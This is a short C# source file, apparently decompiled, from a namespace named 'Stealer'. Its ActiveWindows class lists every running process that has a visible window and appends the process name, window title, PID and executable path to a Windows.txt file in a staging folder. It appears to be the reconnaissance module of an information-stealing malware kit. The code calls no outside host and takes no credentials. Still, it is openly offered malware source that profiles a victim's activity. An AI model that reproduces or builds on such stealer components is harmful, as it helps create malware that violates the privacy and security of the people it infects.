﻿using System;
using System.Diagnostics;
using System.IO;

namespace Stealer
{
	// Token: 0x0200001D RID: 29
	internal sealed class ActiveWindows
	{
		// Token: 0x0600008A RID: 138 RVA: 0x00004D4C File Offset: 0x00002F4C
		public static void WriteWindows(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				try
				{
					if (!string.IsNullOrEmpty(process.MainWindowTitle))
					{
						File.AppendAllText(sSavePath + "\\Windows.txt", string.Concat(new string[]
						{
							"NAME: ",
							process.ProcessName,
							"\n\tTITLE: ",
							process.MainWindowTitle,
							"\n\tPID: ",
							process.Id.ToString(),
							"\n\tEXE: ",
							ProcessList.ProcessExecutablePath(process),
							"\n\n"
						}));
					}
				}
				catch
				{
				}
			}
		}
	}
}
